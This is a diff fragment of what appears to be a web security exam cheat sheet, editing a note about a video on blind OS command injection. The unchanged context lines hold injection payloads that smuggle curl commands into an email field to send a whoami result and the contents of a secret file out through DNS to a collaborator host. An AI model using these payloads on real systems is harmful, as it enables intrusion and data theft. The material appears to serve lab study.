@@ -3243,7 +3243,7 @@ email=carlos@exam.net||curl+`whoami`.COLLABORATOR.net||
 ||$(curl $(cat /home/carlos/secret).COLLABORATOR.com)||
 ```  
 
->In this youTube video [Leet Cipher](https://youtu.be/o7oVWXw4t5E) show how to use blind command injection to exfiltration the contents of `passwd` from the target by first uploading bash script that Base64 and then Base58 encode the `passwd` file content, to strip special character not able to ex-filtrate with DNS label restrictions.  
+>In this YouTube video [Leet Cipher](https://youtu.be/o7oVWXw4t5E) show how to use DNS rebinding with blind command injection to exfiltration the contents of `passwd` from the target by first uploading bash script that Base64 and then Base58 encode the `passwd` file content, to strip special character not able to ex-filtrate with DNS label restrictions.  
 
 ![OS command injection](images/os-command-inject.png)  
 
